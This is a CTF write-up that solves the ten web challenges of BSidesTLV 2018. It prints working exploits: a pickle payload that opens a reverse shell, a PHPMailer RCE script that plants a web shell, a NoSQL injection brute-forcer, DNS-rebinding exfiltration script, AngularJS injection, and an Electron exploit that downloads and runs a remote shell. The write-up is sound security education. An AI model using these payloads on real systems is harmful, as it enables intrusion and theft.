@@ -1,0 +1,719 @@
+
+
+BSidesTLV: 2018 CTF (Web)
+
+
+
+
+
+
+
+
+Bernie Lim
+
+
+
+
+A security enthusiast. Likes cats.
+
+
+
+
+
+11 Oct 2018
+
+
+
+29 min read
+
+
+0 Comments
+
+
+
+
+
+This post documents my attempt to complete BSidesTLV: 2018 CTF (Web). If you are uncomfortable with spoilers, please stop reading now.
+
+Background
+The 2018 BSidesTLV CTF competition brought together over 310 teams burning the midnight oil to crack our challenges in a bout that lasted for two weeks. You can now enjoy the same pain and suffering, using this easy-to-use, condensed VM that now hosts all our challenges in an easy to digest format. The CTF has five categories:
+
+Web (10 challenges)
+
+Redirect me
+IH8emacs
+Creative Agency
+Iâm Pickle Rick!
+ContactUs
+ NoSocket
+IAmBrute
+PimpMyRide
+Can you bypass the SOP?
+GamingStore
+
+
+Reverse Engineering (3 challenges)
+Misc (3 challenges)
+Forensics (1 challenge)
+Crypto (2 challenges)
+
+What follows is my humble attempt of cracking the challenges in the Web category.
+Redirect me
+This is how the challenge looks like.
+
+If I had to guess, I would say the âRefererâ header needs to set to the Youtube URL before visiting the challenge URL. To that end, I wrote a bash script to do so.
+redirect.sh
+#!/bin/bash
+
+REFERER=https://www.youtube.com/watch?v=hGlyFc79BUE
+CHALLENGE=http://challenges.bsidestlv.com:8081/
+
+curl -iLs \
+     -c cookie \
+     -w %{redirect_url} \
+     --referer "$REFERER" \
+     --max-redir -1 \
+     --no-styled-output \
+     $CHALLENGE
+
+echo &amp;&amp; rm cookie
+
+OK. Letâs give it a shot.
+
+You can see that it got redirected for forty times before displaying the flag.
+The flag is BSidesTLV{D0ntF0rgetR3sp0ns3H34d3r}.
+IH8emacs
+This is how the challenge looks like.
+
+The Adventurer theme looks awesome but thatâs not the point. From the title and description, the challenge seems to be hinting at Emacs and its backup. A backup file has a tilde (~) at the end of the file name. For example, letâs say you are editing index.php with Emacs, the backup file is index.php~. Emacs automatically backups the edited file.
+
+Sweet.
+
+At the end of the file is a directory hidden in HTML comment.
+
+Argh! Stalled by basic auth. .htpasswd in Apache controls basic authentication. Perhaps we can catch a glimpse of its backup?
+
+OMFG!
+
+John the Ripper is able to crack the password hash effortlessly. Now, letâs log in and claim the prize.
+
+The flag is BSidesTLV{D0ntF0rg3tB4ckupF1l3s}.
+Creative Agency
+This is how the challenge looks like.
+
+This is an interesting challenge. Notice something odd in the address bar?
+
+The file path is mirror-flipped! And since we know the flag is at /home/bsidestlv/flag.txt, we need to supply it in the same style to the web application. This is how the file path should read.
+
+Iâve painstakingly teased out the characters needed from existing images, except for the characters âfâ and âvâ. Visit any online site that helps to mirror text to get the mirror-flipped âfâ and âvâ
+And yes, you need directory traversal as well.
+
+The flag is BSidesTLV{I_Like_FlipFlops_And_I_Cannot_Lie}.
+Iâm Pickle Rick!
+This is how the challenge looks like.
+
+Your first thought could be thisâbrute-force the login form and call it a day. Thereâs something going on behind the scenes, a.k.a XHR or XMLHttpRequest you are unaware of until you see it.
+
+And if you go to the URL, this is what you see.
+
+See what happens when you put in an empty data parameter.
+
+Bear with me. We are getting to the root of the challenge.
+
+Here, I did a base64 decode of the value after the data parameter, and pipe it to file. What do you see? zlib compressed data? Letâs decompress it.
+
+What do we have here? This looks like Pythonâs data serialization using pickle. In fact, the name of the challenge is a dead giveaway right from the get-go.
+Thereâs plenty of Google results on this subject but I find this blog post has the best explanation. Armed with this knowledge, I wrote a Python exploit that will serialize a Python object that runs a reverse shell back to me.
+picklerick.py
+import base64
+import os
+import pickle
+import socket
+import subprocess
+import urllib
+import zlib
+
+class Evil(object):
+  def __reduce__(self):
+    return (os.system, ("python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.30.128\",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\",\"-i\"]);'", ))
+
+print urllib.quote(base64.b64encode(zlib.compress(pickle.dumps(Evil()))))
+
+Letâs run the exploit.
+
+Copy the output of this exploit and supply it as the value to the data parameter above, and let the web application perform the deserialization.
+On another terminal, set up a nc listener and wait for the reverse shell.
+
+Voila, we have shell. The flag is at /flag.txt
+
+The flag is BSidesTLV{IC0ntr0ll3dP1ckl3R1ck!}.
+ContactUs
+This is how the challenge looks like.
+
+A simple fuzz works wonders.
+# wfuzz -w /usr/share/seclists/Discovery/Web-Content/common.txt --hc 404 http://challenges.bsidestlv.com:8080/FUZZ
+********************************************************
+* Wfuzz 2.2.11 - The Web Fuzzer                        *
+********************************************************
+
+Target: http://challenges.bsidestlv.com:8080/FUZZ
+Total requests: 4593
+
+==================================================================
+ID	Response   Lines      Word         Chars          Payload    
+==================================================================
+
+000010:  C=403     11 L	      32 W	    305 Ch	  ".hta"
+000011:  C=403     11 L	      32 W	    310 Ch	  ".htaccess"
+000012:  C=403     11 L	      32 W	    310 Ch	  ".htpasswd"
+000862:  C=301      9 L	      28 W	    343 Ch	  "cache"
+001232:  C=301      9 L	      28 W	    341 Ch	  "css"
+002073:  C=301      9 L	      28 W	    341 Ch	  "img"
+002095:  C=200    407 L	    1124 W	  14764 Ch	  "index.php"
+002250:  C=301      9 L	      28 W	    340 Ch	  "js"
+002992:  C=301      9 L	      28 W	    347 Ch	  "phpmailer"
+003597:  C=403     11 L	      32 W	    314 Ch	  "server-status"
+
+Total time: 7.736274
+Processed Requests: 4593
+Filtered Requests: 4583
+Requests/sec.: 593.6966
+
+Notice the directory phpmailer exists?
+
+And itâs PHPMailer 5.2.16!
+PHPMailer versions before 5.2.18 is susceptible to remote command execution, as documented in CVE-2016-10033. The contact form in this challenge has added CAPTCHA for verification. Good thing for us, the CAPTCHA uses a four-digit number, which OCR can bypass.
+
+To that end, I wrote a bash script, using gocr, pngtopnm and curl as the main drivers for the exploit.
+contactme.sh
+#!/bin/bash
+
+CHALLENGE=http://challenges.bsidestlv.com:8080
+TARGETURL="$CHALLENGE/index.php"
+CAPTCHAURL="$CHALLENGE/captcha.php"
+
+# Session
+curl -s \
+     -c cookie \
+     -o /dev/null \
+     $TARGETURL
+
+# Captcha
+CAPTCHA=$(curl -s -b cookie $CAPTCHAURL \
+          | pngtopnm \
+          | gocr -i -)
+
+DOCROOT=/var/www/html
+FILENAME=$(sed '$!d' cookie | awk '{ print $NF }' | cut -c3-14).php
+LOCATION=$DOCROOT/cache/$FILENAME
+
+# Exploit
+STATUS=$(curl -s \
+              -b cookie \
+              -o /dev/null \
+              -w %{http_code} \
+              --data-urlencode 'fullname=&lt;?php echo shell_exec($_GET["cmd"]); ?&gt;' \
+              --data-urlencode "email_address=\"badguy\\\" -oQ/tmp/ -X$LOCATION blah\"@badguy.com" \
+              --data-urlencode "yourmessage=blah blah blah" \
+              --data-urlencode "captcha=$CAPTCHA" \
+              --data-urlencode "actions=SUBMIT" \
+              $TARGETURL)
+
+if [ $STATUS -eq 200 ]; then
+  echo "[+] Check $CHALLENGE/cache/$FILENAME?cmd=[shell command, e.g. id]"
+else
+  echo "[!] Exploit failed"
+fi
+
+# Clean up
+rm -f cookie
+
+The first version of the exploit didnât work. But, the creators of this challenge were kind enough to leave a hint on how to proceed.
+
+The challenge now becomes an exercise in determining the file name. 
+
+The file name is from the PHPSESSID! Armed with this knowledge, letâs run the exploit.
+
+The exploit took a couple of minutes to complete.
+
+It works! Time to find the flag and capture it.
+
+
+The flag is BSidesTLV{K33pY0urM4il3rFullyP4tch3D!}.
+NoSocket
+This is how the challenge looks like.
+
+Opening the challenge URL leads you to a login page.
+
+It may look like nothing but thereâs actually WebSocket going on behind the scenes.
+
+Hereâs the login function.
+
+Iâm no NoSQL expert (pun intended). But, if I had to guess, I would say the challenge looks a classic NoSQL injection to bypass authentication. After consulting with OWASP testing guide, Iâve settled with this injection through the password field. We already knew the username is admin.
+' || 1 == '1
+
+
+Building on the previous injection, we can tease out the flag with this test.
+' || this.password[x] == 'y
+
+Where x is the index into the flag and y is the character to test. Armed with this insight, I wrote a bash script to automate that.
+nosocket.sh
+#!/bin/bash
+SERVER=ws://challenges.bsidestlv.com:8000/login
+EXPLOIT="{\"username\":\"admin\",\"password\":\"' || this.password["
+
+for i in $(seq 0 40); do
+  for c in $(seq 32 126); do
+    STATUS=$(echo "${EXPLOIT}$i] == '$(printf \\$(printf %o $c))\"}"\
+             | websocat $SERVER)
+    if [ "$STATUS" == "Success!" ]; then
+      printf \\$(printf "%o" $c)
+    fi
+  done
+done
+
+echo
+
+The script is basically a wrapper around websocat, a command-line WebSocket client. We send the injection string in JSON over to the WebSocket server and wait for the response. If the response is Success!, the test character gets printed out.
+Hereâs a teaser animation of the script in action.
+
+
+  var vid = document.getElementById("video");
+  vid.playbackRate = 2.0;
+
+The flag is BSidesTLV{0r0n3Equ4l0n3!}.
+IAmBrute
+This is how the challenge looks like.
+
+Thereâs a link to download an attachment, an archive file.
+
+Looks like we have a 1Password OPVault. After reading the design paper, the entire design is succinctly summarized in a sweet poem.
+
+Each item keyâs encrypted with the master key
+And the master keyâs encrypted with the derived key
+And the derived key comes from the MP
+Oh hear the word of the XOR
+Them keys, them keys, them random keys (3x)
+Oh hear the word of the XOR
+
+John the Ripper comes to the rescue! We can make use of 1pass2john.py to create a JtR hash for offline cracking to recover the master password.
+
+Letâs crack it.
+
+The master password is Marina. Of course!
+Next, we use 1Password to open the vault and see whatâs in it.
+
+Supply the master password.
+
+Voila.
+
+I guess I must now sign in to the ticketing system with (marina:Marina1987!)ânot so fast.
+
+You can see that the site checks for IP address, probably through the X-Forwarded-For HTTP header. This is easy to bypass with Burp and the Bypass WAF extension. The instruction to install, configure, and use the Bypass WAF extension is beyond the scope of this write-up.
+
+Looking at Marinaâs tickets, youâll soon discover another user of the ticketing systemâGeorge Stones.
+
+Clicking on his avatar opens another window to his Facebook page, disclosing his birth year (1991) and his favorite TV show (FRIENDS).
+
+Having these two pieces of information allows us to brute-force the Forgot My Password page at pwreset.php.
+
+Letâs summarize what we know so far:
+
+Username is his first name: george
+
+Georgeâs birth year is 1991
+His favorite TV show is FRIENDS
+
+
+The sole unknown variable is Georgeâs birth date. We can use the following command to generate a wordlist of all the birthdays in 1991 like so.
+# echo {01..31}/{01..12}/1991 | tr ' ' '\n' | sort -R &gt; birthdays.txt
+
+The challengeâs creators were kind enough to fix the CSRF token for pwreset.php. Without this gesture, brute-forcing pwreset.php will be harder. Letâs use wfuzz to do this!
+
+Thatâs fast! Georgeâs birthday is 07/11/1991. Letâs pop his birthday in.
+
+Now, letâs sign in to Georgeâs account.
+
+The flag is BSidesTLV{Brut3Th3W0rld!}.
+PimpMyRide
+This is how the challenge looks like.
+
+Youâll need a Java decompiler for this challenge. Iâm using Enhanced Class Decompiler (or ECD) for Eclipse. The instruction to install, configure, and use ECD in Eclipse is beyond the scope of this write-up.
+Youâll also need a tool to dump Java serialized byte streams. For that, Iâm using SerializationDumper.
+In summary, the file garage.jar encapsulates both the client and the server as shown below.
+
+Having both client and server functionality greatly helps in understanding the behavior of the program. The client connects to the Garage to add cars, with the ability to save or export the Garage to a fileâgarage. The file content is in the form of Java serialized byte stream, characterized by these first two bytesâ0xAC and 0xED.
+The server reads the byte stream in garage from the client and reconstruct the Garage in a process known as deserialization.
+The challenge is to construct a garage file that allows us to read /flag.txt from the server.
+First, letâs take a look at two important Class files to find the vulnerability that allows us to read a file.
+Garage.class
+import java.io.ByteArrayOutputStream;
+import java.io.IOException;
+import java.io.ObjectInputStream;
+import java.io.ObjectOutputStream;
+import java.io.Serializable;
+import java.util.ArrayList;
+
+public class Garage implements Serializable {
+	private ArrayList&lt;Car&gt; carArray = new ArrayList();
+	private int carLimit = 5;
+	private Employee garageManager;
+	private ArrayList&lt;Employee&gt; garageEmployees = new ArrayList();
+	private boolean isOpen = true;
+
+	public boolean addCar(Car car) {
+		if (this.isOpen) {
+			this.carArray.add(car);
+			this.checkGarageStatus();
+			return true;
+		} else {
+			return false;
+		}
+	}
+
+	public boolean removeCarByLicenseNumber(String licenseNumber) {
+		for (int i = 0; i &lt; this.carArray.size(); ++i) {
+			if (((Car) this.carArray.get(i)).getLicenseNumber().equals(licenseNumber)) {
+				this.carArray.remove(i);
+				return true;
+			}
+		}
+
+		return false;
+	}
+
+	public String printGarage() {
+		String garageContent = "";
+
+		for (int i = 0; i &lt; this.carArray.size(); ++i) {
+			garageContent = garageContent + "Car Manufacturer: " + ((Car) this.carArray.get(i)).getManufacturerName()
+					+ "\r\n" + "Car License Number: " + ((Car) this.carArray.get(i)).getLicenseNumber() + "\r\n"
+					+ "Car Manufacturing Year: " + ((Car) this.carArray.get(i)).getManufacturingYear() + "\r\n";
+		}
+
+		return garageContent;
+	}
+
+	public boolean checkGarageStatus() {
+		if (this.carArray.size() == this.carLimit) {
+			this.garageManager.doWork();
+			this.isOpen = false;
+			return false;
+		} else {
+			return true;
+		}
+	}
+
+	private void readObject(ObjectInputStream in) throws ClassNotFoundException, IOException {
+		in.defaultReadObject();
+		this.checkGarageStatus();
+	}
+
+	public void setManager(Employee manager) {
+		this.garageManager = manager;
+	}
+
+	public byte[] toByteArray() throws IOException {
+		ByteArrayOutputStream out = new ByteArrayOutputStream();
+		ObjectOutputStream os = new ObjectOutputStream(out);
+		os.writeObject(this);
+		return out.toByteArray();
+	}
+}
+
+Method setManager() allows us to set a Manager in Garage.
+Manager.class
+import java.io.File;
+import java.io.FileInputStream;
+import java.io.IOException;
+import java.io.ObjectInputStream;
+import java.io.Serializable;
+
+public class Manager extends Employee implements Serializable {
+	private String closeMessageFile = "close.txt";
+	private String closeMessage;
+
+	public Manager() throws IOException {
+		this.logger = new FileLogger("log.txt");
+		this.closeMessage = null;
+	}
+
+	public void setCloseMessage(String closeMessage) {
+		this.closeMessage = closeMessage;
+	}
+
+	public void doWork() {
+		this.logger.writeToLog(this.closeMessage);
+	}
+
+	public void setCloseMessageFile(String closeMessageFile) {
+		this.closeMessageFile = closeMessageFile;
+	}
+
+	private void readObject(ObjectInputStream in) throws ClassNotFoundException, IOException {
+		in.defaultReadObject();
+
+		try {
+			if (this.closeMessage == null) {
+				File closeMessageFile = new File(this.closeMessageFile);
+				FileInputStream fis = new FileInputStream(closeMessageFile);
+				byte[] data = new byte[(int) closeMessageFile.length()];
+				fis.read(data);
+				fis.close();
+				this.closeMessage = new String(data, "UTF-8");
+			}
+		} catch (IOException var5) {
+			;
+		}
+
+	}
+}
+
+You can see closeMessageFile set to close.txt and if the closeMessage is null, itâs set to the contents of closeMessageFile.
+Thatâs our vulnerability. If we change close.txt to /flag.txt, we should be able to trick the server to write the contents of /flag.txt to garage, through deserialization of the Manager object.
+To that end, I modified two lines of Manager.class like so. Save it as Manager.java.
+
+I wrote the following exploit to generate the malicious garage file.
+Exploit.java
+import java.io.*;
+
+public class Exploit {
+
+  public static void main(String[] args) {
+    try {
+
+      Employee emp = new Manager();
+      Garage g = new Garage();
+      g.setManager(emp);
+      g.addCar(new Car("Honda" , "H4CK3R", "2001"));
+
+      FileOutputStream fos = new FileOutputStream("garage");
+      fos.write(g.toByteArray());
+      fos.close();
+
+    } catch (Exception e) {
+      System.err.println(e);
+    }
+  }
+}
+
+Extract all the Class files from garage.jar except for Manager.class to where Exploit.java and Manager.java are. Then, compile Exploit.java like so.
+
+Now, letâs give it a shot.
+
+We donât have to do anything special. Saving the Garage will trigger deserialization of the Manager object, and save the contents of /flag.txt to garage.
+Letâs check out garage with SerializationDumper.
+
+The flag is BSidesTLV{I_Am_Inspector_Gadget}.
+Can you bypass the SOP?
+This is how the challenge looks like.
+
+This challenge is basically an exercise to bypass the Same Origin Policy (SOP) enforced by browsers. One of the most effective way of bypassing SOP is to use DNS Rebinding described here.
+In any case, letâs check out the bot. This is how it looks like.
+
+Letâs provide the bot with my IP address where Apache is running.
+
+In this way, I can view the logs and see who or what is making the request.
+# tail -f /var/log/apache2/access.log
+192.168.30.129 - - [06/Oct/2018:03:23:24 +0000] "GET / HTTP/1.1" 200 3380 "-" "python-requests/2.19.1"
+192.168.30.129 - - [06/Oct/2018:03:23:25 +0000] "GET / HTTP/1.1" 200 3380 "-" "Mozilla/5.0 (Unknown; Linux x86_64) AppleWebKit/538.1 (KHTML, like Gecko) PhantomJS/2.1.1 Safari/538.1"
+
+Interesting. You can see two requests seconds apart. The first request is from Python Requestâthe challenge page itself. The second request is from PhantomJS, a headless browser. This must be the bot.
+To get the DNS Rebinding attack going, letâs use DDNS service to register the following two hostnames: h4ck3rboi and h4ck3rman.
+
+Open two Python SimpleHTTPServer running behind 8080/tcp and 8888/tcp, for h4ck3rman and h4ck3rboi respectively.
+# python -m SimpleHTTPServer 8080
+# python -m SimpleHTTPServer 8888
+
+Save the following file at the same location as h4ck3rman.
+index.html
+&lt;script&gt;
+setTimeout(function() {
+  var xhr = new XMLHttpRequest();
+  xhr.open("GET", "http://h4ck3rman.ddns.net:8080/login");
+  xhr.onreadystatechange = function () {
+    if (xhr.readyState === 4) {
+      var img = new Image();
+      img.src = "http://h4ck3rboi.ddns.net:8888/hello.txt?x=" + btoa(xhr.responseText);
+    }
+  };
+  xhr.send();
+}, 120000);
+&lt;/script&gt;
+
+Make a request for the file through the bot.
+
+Verify the two requests are coming in through 8080/tcp.
+
+Change the IP address mapped to h4ck3rman to 192.168.20.100 at once. Two minutes later, h4ck3rboi listening at 8888/tcp, received the XHR response.
+
+The response (login page) after decoding is as follows.
+&lt;!DOCTYPE html&gt;
+&lt;html lang="en"&gt;
+&lt;head&gt;
+    &lt;meta charset="UTF-8"&gt;
+    &lt;title&gt;Login page&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;form method="post"&gt;
+        &lt;div class="form-group"&gt;
+            &lt;label for="url" class="col-sm-3 control-label"&gt;Username&lt;/label&gt;
+            &lt;div class="col-sm-9"&gt;
+                &lt;input type="text" id="url" name='username' placeholder="Username"&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+
+        &lt;div class="form-group"&gt;
+            &lt;label for="password" class="col-sm-3 control-label"&gt;Password&lt;/label&gt;
+            &lt;div class="col-sm-9"&gt;
+                &lt;input type="password" id="password" name='password' placeholder="Password"&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+
+        &lt;div class="form-group"&gt;
+            &lt;div class="col-sm-9 col-sm-offset-3"&gt;
+                &lt;!--Default credentials: admin/admin--&gt;
+                &lt;button type="submit" name='submit' class="btn btn-primary btn-block"&gt;Login!&lt;/button&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/center&gt;
+    &lt;div class="form-group"&gt;
+
+
+
+                &lt;/div&gt;
+            &lt;/form&gt; &lt;!-- /form --&gt;
+        &lt;/div&gt; &lt;!-- ./container --&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+
+You can see that itâs a simple login form. Whatâs interesting is the default credentials (admin:admin) hidden in the HTML comment.
+Letâs repeat the steps again, making the following changes to index.html, to simulate logging in.
+index.html
+&lt;script&gt;
+setTimeout(function() {
+  var xhr = new XMLHttpRequest();
+  xhr.open("POST", "http://h4ck3rman.ddns.net:8080/login");
+  xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+  xhr.onreadystatechange = function () {
+    if (xhr.readyState === 4) {
+      var img = new Image();
+      img.src = "http://h4ck3rboi.ddns.net:8888/hello.txt?x=" + btoa(xhr.responseText);
+    }
+  };
+  xhr.send("username=admin&amp;password=admin&amp;submit=");
+}, 120000);
+&lt;/script&gt;
+
+Verify the two requests are coming in through 8080/tcp.
+
+Change the IP address mapped to h4ck3rman to 192.168.20.100 at once. Two minutes later, h4ck3rboi listening at 8888/tcp receives the XHR response.
+
+The response (flag) after decoding is as follows.
+&lt;html lang="en"&gt;
+&lt;head&gt;
+    &lt;meta charset="UTF-8"&gt;
+    &lt;title&gt;Login page&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;form method="post"&gt;
+        &lt;div class="form-group"&gt;
+            &lt;label for="url" class="col-sm-3 control-label"&gt;Username&lt;/label&gt;
+            &lt;div class="col-sm-9"&gt;
+                &lt;input type="text" id="url" name='username' placeholder="Username"&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+
+        &lt;div class="form-group"&gt;
+            &lt;label for="password" class="col-sm-3 control-label"&gt;Password&lt;/label&gt;
+            &lt;div class="col-sm-9"&gt;
+                &lt;input type="password" id="password" name='password' placeholder="Password"&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+
+        &lt;div class="form-group"&gt;
+            &lt;div class="col-sm-9 col-sm-offset-3"&gt;
+                &lt;!--Default credentials: admin/admin--&gt;
+                &lt;button type="submit" name='submit' class="btn btn-primary btn-block"&gt;Login!&lt;/button&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/center&gt;
+    &lt;div class="form-group"&gt;
+
+
+
+                          Your flag is: BSidesTLV{C4nY0uR3b1n3dMe?}
+
+
+
+                &lt;/div&gt;
+            &lt;/form&gt; &lt;!-- /form --&gt;
+        &lt;/div&gt; &lt;!-- ./container --&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+
+The flag is BSidesTLV{C4nY0uR3b1n3dMe?}.
+GamingStore
+This is how the challenge looks like.
+
+The docker containers for this challenge: gamestore_bot, gamestore_web, and mongo stopped for some reason. Good thing the creators were kind enough to provide access to the Boot2Docker environment. I was able to log in to the environment and restart these containers.
+Given the credentials (bsidestlv:3d1t0r) to log in, I was quick to notice that I was able to edit the product description.
+
+Notice something? The Game Store is using AngularJS shown below.
+
+What does it all mean? AngularJS Expressions! This means that we can compute expressions like this {{1+1}}, which returns the number 2. We can also make use of {{constructor.constructor("alert(1)")()}} to inject JavaScript into Game Store.
+Letâs introduce some JavaScript to trick the headless browser to visit a URL that I control.
+
+Once itâs saved, the following user-agent appeared in my Apache Access Log.
+Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Nightmare/2.10.0 Safari/537.36
+
+You can see that the headless browser is Nightmare 2.10.0 based on Electron. Searching for ânightmare 2.10.0 electron exploitâ in Google landed me in Issue 1060. Thereâs a link to a public exploit at the third comment.
+Armed with that knowledge, letâs re-purpose the exploit and give Nightmare a taste of its own medicine. 
+exploit.html
+&lt;!doctype html&gt;
+&lt;html&gt;
+    &lt;head&gt;
+        &lt;meta charset="utf-8"&gt;
+        &lt;title&gt;nightmarejs&lt;/title&gt;
+    &lt;/head&gt;
+    &lt;body&gt;
+        &lt;script&gt;
+            "use strict";
+            function exec() {
+                try {
+                    var sendSync = __nightmare.ipc.sendSync;
+                    if (typeof sendSync !== "function") {
+                        return;
+                    }
+                } catch (e) {
+                    return;
+                }
+                /*
+                 * ELECTRON_BROWSER_REQUIRE returns metadata for
+                 * module.exports, and the actual object is stored in
+                 * the objectsRegistry (see valueToMeta())
+                 */
+                var proc = sendSync("ELECTRON_BROWSER_REQUIRE", "child_process");
+                /*
+                 * ELECTRON_BROWSER_MEMBER_CALL retrieves a module object from
+                 * the objectsRegistry and calls the specified method with an
+                 * array of arguments processed by unwrapArgs()
+                 */
+                var args = [{
+                    type: "value",
+                    value: "wget -O /tmp/rev http://h4ckerman.ddns.net/rev; chmod +x /tmp/rev; /tmp/rev"
+                }];
+                sendSync("ELECTRON_BROWSER_MEMBER_CALL", proc.id, "exec", args);
+            }
+            exec();
+        &lt;/script&gt;
+    &lt;/body&gt;
+&lt;/html&gt;
+
+Serve the reverse shell (generated with msfvenom) to Nightmare, and have it execute the reverse shell with the following AngularJS expression.
+{{constructor.constructor("document.location='http://h4ck3rman.ddns.net/exploit.html'")()}}
+
+Meanwhile in our nc listener.
+
+The flag is BSidesTLV{AngularjS_is_Freddy_Krueger}.
+
